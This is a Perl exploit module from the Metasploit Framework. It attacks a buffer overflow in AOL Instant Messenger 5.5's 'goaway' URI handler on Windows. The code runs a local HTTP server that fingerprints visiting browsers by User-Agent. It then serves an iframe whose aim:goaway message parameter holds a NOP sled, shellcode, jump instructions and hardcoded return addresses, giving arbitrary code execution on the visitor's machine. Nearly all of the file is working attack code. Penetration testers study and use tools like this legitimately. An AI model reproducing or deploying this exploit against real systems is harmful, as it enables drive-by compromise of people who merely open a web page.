
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::aim_goaway;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;

my $advanced =
{
};

my $info =
{
	'Name'           => 'AOL Instant Messenger goaway Overflow',
	'Version'        => '$Revision: 1.4 $',
	'Authors'        => 
		[
			'skape <mmiller [at] hick.org>',
			'thief <thief [at] uninformed.org>'
		],
	'Description'    => 
		Pex::Text::Freeform(qq{
			This module exploits a flaw in the handling of AOL Instant
			Messenger's 'goaway' URI handler.  An attacker can execute 
			arbitrary code by supplying a overly sized buffer as the 
			'message' parameter.  This issue is known to affect AOL Instant 
			Messenger 5.5.
		}),
	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'           => 0,
	'UserOpts'       => 
		{
			'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
			'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
		},
	'Payload'        => 
		{
			'Space'    => 1014,
			'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
			'MaxNops'  => 1014, 
			'Keys'     => [ '-ws2ord' ],
		},
	'Refs'           => 
		[
			[ 'OSVDB', 8398 ],
			'http://www.idefense.com/application/poi/display?id=121&type=vulnerabilities',
		],
	'DefaultTarget'  => 0,
	'Targets'        =>
		[
			[ 'Automatic',      0x1108118f ], # proto.ocm
			[ "Windows XP SP0", 0x71aa2461 ], # ws2help.dll
		],
	'Keys'           => [ 'aim' ],
};

sub new
{
	my $class = shift;
	my $self;
	
	$self = $class->SUPER::new(
			{ 
				'Info'     => $info,
				'Advanced' => $advanced,
			},
			@_);

	return $self;
}

sub Exploit
{
	my $self = shift;
	my $server     = IO::Socket::INET->new(
			LocalHost => $self->GetVar('HTTPHOST'),
			LocalPort => $self->GetVar('HTTPPORT'),
			ReuseAddr => 1,
			Listen    => 1,
			Proto     => 'tcp');
	my $client;

	# Did the listener create fail?
	if (not defined($server))
	{
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	$self->PrintLine("[*] Waiting for connections to http://" . $self->GetVar('HTTPHOST') . ":" . $self->GetVar('HTTPPORT') . " ...");

	while (defined($client = $server->accept()))
	{
		$self->HandleHttpClient(fd => $client);
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my ($fd) = @{{@_}}{qw/fd/};
	my $targetIdx = $self->GetVar('TARGET');
	my $target    = $self->Targets->[$targetIdx];
	my $ret       = $target->[1];
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	my $content;
	my $rhost;
	my $rport;
	my $os = "Unknown";

	# Read the HTTP command
	my ($cmd, $url, $proto) = split / /, <$fd>;

	# Read in the HTTP headers
	while (<$fd>)
	{
		my ($var, $val) = split /: /, $_;

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		if ($var eq 'User-Agent')
		{
			$os = "Windows 2003" if (!$os and $val =~ /Windows NT 5.2/);
			$os = "Windows XP"   if (!$os and $val =~ /Windows NT 5.1/);
			$os = "Windows 2000" if (!$os and $val =~ /Windows NT 5.0/);
			$os = "Windows NT"   if (!$os and $val =~ /Windows NT/);
		}
	}

	# Build the HTML
	my $src     = ($self->MakeNops(1014 - length($shellcode))) . # nops
	              $shellcode .                                   # payload
	              "\xeb\x07\x90\x90" .                           # jmp +7
	              pack("V", $ret) .                              # return address
	              "\x90\xe9\x13\xfc\xff\xff";                    # jmp -1000
	my $content = 
		"<html>
			<iframe src='aim:goaway?message=$src'>
		</html>";

	# Set the remote host
	($rport, $rhost) = sockaddr_in(getpeername($fd));
	$rhost           = inet_ntoa($rhost);

	$self->PrintLine("[*] HTTP Client connected from $rhost using $os, sending payload...");
	
	# Transmit the HTTP response
	print $fd "HTTP/1.1 200 OK\r\n" .
	          "Content-Type: text/html\r\n" .
	          "Content-Length: " . length($content) . "\r\n" .
	          "Connection: close\r\n" .
	          "\r\n" .
	          "$content";

	$fd->close();
}

1;
